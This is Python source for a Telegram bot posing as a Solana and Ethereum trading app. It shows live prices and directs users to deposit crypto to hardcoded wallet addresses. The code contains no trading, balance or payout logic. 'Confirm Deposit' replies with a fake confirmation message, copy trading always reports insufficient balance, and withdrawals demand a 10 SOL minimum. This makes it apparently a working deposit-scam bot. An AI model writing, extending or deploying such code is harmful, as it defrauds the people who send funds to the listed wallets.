import os
from flask import Flask
import threading

app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

threading.Thread(target=run_flask, daemon=True).start()
import os
import requests
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# Store token securely or retrieve from environment variable
TOKEN = os.getenv("TELEGRAM_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN_HERE")

def get_live_prices():
    """Fetches real-time SOL and ETH prices in USD from CoinGecko API."""
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=solana,ethereum&vs_currencies=usd"
        response = requests.get(url, timeout=5)
        data = response.json()
        sol_price = data.get("solana", {}).get("usd", "N/A")
        eth_price = data.get("ethereum", {}).get("usd", "N/A")
        return sol_price, eth_price
    except Exception:
        return "N/A", "N/A"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("Buy 🚀"), KeyboardButton("Sell ⚒️")],
        [KeyboardButton("Copy trade ⚡")],
        [KeyboardButton("Signal 📡"), KeyboardButton("Withdrawal 📤"), KeyboardButton("My Trade 📊")],
        [KeyboardButton("📦 History"), KeyboardButton("Position 📉"), KeyboardButton("Help 🙋‍♂️")],
        [KeyboardButton("Setting ⚙️"), KeyboardButton("DCA orders"), KeyboardButton("Referral 💰")]
    ]
    
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "Welcome to Solana trade App!\n\nChoose an option from the menu below:",
        reply_markup=reply_markup
    )

async def handle_button_clicks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text

    if user_text == "Buy 🚀":
        # Fetch external API market prices
        sol_price, eth_price = get_live_prices()

        msg = (
            f"⚡ *Live Market Prices*\n"
            f"• SOL: `${sol_price}`\n"
            f"• ETH: `${eth_price}`\n\n"
            "Buy crypto now and start trading:\n\n"
            "Wallet address (Solana):\n"
            "`7HaHWKc7wiDzw8GzSCLpdZA8ksZCdVtmQUMekZ1gYJqu`\n\n"
            "Wallet address (Ethereum):\n"
            "`0x8B1D0a25226DF6Ef99B223411A0516ae40803eaC`"
        )

        # Interactive Inline Buttons
        inline_keyboard = [
            [
                InlineKeyboardButton("🔄 Refresh Prices", callback_data="refresh_prices"),
                InlineKeyboardButton("🌐 Explorer", url="https://solscan.io")
            ],
            [
                InlineKeyboardButton("✅ Confirm Deposit", callback_data="confirm_deposit")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(inline_keyboard)

        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=reply_markup)

    elif user_text == "Copy trade ⚡":
        inline_keyboard = [
            [InlineKeyboardButton("⚡ Start Copy Trading", callback_data="start_copy_trade")]
        ]
        reply_markup = InlineKeyboardMarkup(inline_keyboard)
        await update.message.reply_text(
            "You need a minimum of 3-5 SOL on your bot account to copy trade. Stakes are high.",
            reply_markup=reply_markup
        )

    elif user_text == "Withdrawal 📤":
        await update.message.reply_text("Minimum 10 SOL before withdrawal can be approved.")

    elif user_text == "My Trade 📊":
        await update.message.reply_text("No live trade")

    else:
        await update.message.reply_text(f"You selected: {user_text}")

async def handle_inline_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles clicks on interactive inline buttons."""
    query = update.callback_query
    await query.answer()  # Removes the loading spinner on the button

    if query.data == "refresh_prices":
        sol_price, eth_price = get_live_prices()
        updated_text = (
            f"⚡ *Live Market Prices (Refreshed)*\n"
            f"• SOL: `${sol_price}`\n"
            f"• ETH: `${eth_price}`\n\n"
            "Buy crypto now and start trading:\n\n"
            "Wallet address (Solana):\n"
            "`7HaHWKc7wiDzw8GzSCLpdZA8ksZCdVtmQUMekZ1gYJqu`\n\n"
            "Wallet address (Ethereum):\n"
            "`0x8B1D0a25226DF6Ef99B223411A0516ae40803eaC`"
        )
        await query.edit_message_text(
            text=updated_text, 
            parse_mode="Markdown", 
            reply_markup=query.message.reply_markup
        )

    elif query.data == "confirm_deposit":
        await query.message.reply_text("⚠️ Deposit check initiated. Please allow 1-3 network confirmations.")

    elif query.data == "start_copy_trade":
        await query.answer(text="Insufficient balance! Minimum 3 SOL required.", show_alert=True)

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()

    # Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_clicks))
    app.add_handler(CallbackQueryHandler(handle_inline_callbacks))

    print("Bot is running...")
    app.run_polling()
        
    
